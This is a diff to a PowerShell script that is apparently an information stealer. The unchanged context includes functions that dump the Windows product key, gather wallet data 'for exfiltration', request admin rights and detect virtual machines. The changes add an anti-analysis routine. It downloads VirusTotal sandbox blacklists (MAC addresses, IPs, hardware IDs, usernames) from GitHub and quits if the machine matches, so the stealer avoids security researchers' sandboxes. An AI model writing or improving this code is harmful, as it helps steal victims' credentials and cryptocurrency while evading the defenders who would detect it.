@@ -3,15 +3,15 @@ $ProgressPreference = 'SilentlyContinue' # Hide all Progresses
 
 # Single Instance (no overloads)
 function MUTEX-CHECK {
-$AppId = "16fcb8bb-e281-472d-a9f6-39f0f32f19f2" # This GUID string is interchangeable
-$CreatedNew = $false
-$script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
-if( -not $CreatedNew ) {
-    throw "An instance of this script is already running."
-}  
-else {
-	Invoke-ANTIVM
-}
+    $AppId = "16fcb8bb-e281-472d-a9f6-39f0f32f19f2" # This GUID string is interchangeable
+    $CreatedNew = $false
+    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
+    if( -not $CreatedNew ) {
+        throw "An instance of this script is already running."
+    }  
+    else {
+        Invoke-ANTITOTAL
+    }
 }
 
 function CHECK_IF_ADMIN {
@@ -210,7 +210,6 @@ function EXFILTRATE-DATA {
         }
     }
     
-    $ProductKey = Get-ProductKey
     Get-ProductKey > $env:localappdata\temp\ProductKey.txt	
 	
 	# Create temporary directory to store wallet data for exfiltration
@@ -495,6 +494,85 @@ function Request-Admin {
         }
         catch {}
     }
+}
+
+function Invoke-ANTITOTAL {
+    $urls = @(
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
+    )
+    $functions = @(
+        "Search-Mac",
+        "Search-IP",
+        "Search-HWID",
+        "Search-Username"
+    )
+    
+    for ($i = 0; $i -lt $urls.Count; $i++) {
+        $url = $urls[$i]
+        $functionName = $functions[$i]
+        
+        $result = Invoke-WebRequest -Uri $url -Method Get
+        if ($result.StatusCode -eq 200) {
+            $content = $result.Content
+            $function = Get-Command -Name $functionName
+            $output = & $function.Name $content
+            
+            if ($output -eq $true) {
+                Write-Host "Closing the app..."
+                Exit
+            }
+        }
+        else {
+            Write-Host "Failed to retrieve content from URL: $url"
+            Exit
+        }
+    }
+    Invoke-ANTIVM
+}
+
+
+function Search-Mac ($mac_addresses) {
+    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
+    ForEach ($mac123 in $mac_addresses) {
+        if ($pc_mac -contains $mac123) {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Search-IP ($ip_addresses) {
+    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
+    $pc_ip = $pc_ip.Content
+    ForEach ($ip123 in $ip_addresses) {
+        if ($pc_ip -contains $ip123) {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Search-HWID ($hwids) {
+    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
+    ForEach ($hwid123 in $hwids) {
+        if ($pc_hwid -contains $hwid123) {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Search-Username ($usernames) {
+    $pc_username = $env:USERNAME
+    ForEach ($username123 in $usernames) {
+        if ($pc_username -contains $username123) {
+            return $true
+        }
+    }
+    return $false
 }
 
 function Invoke-ANTIVM {
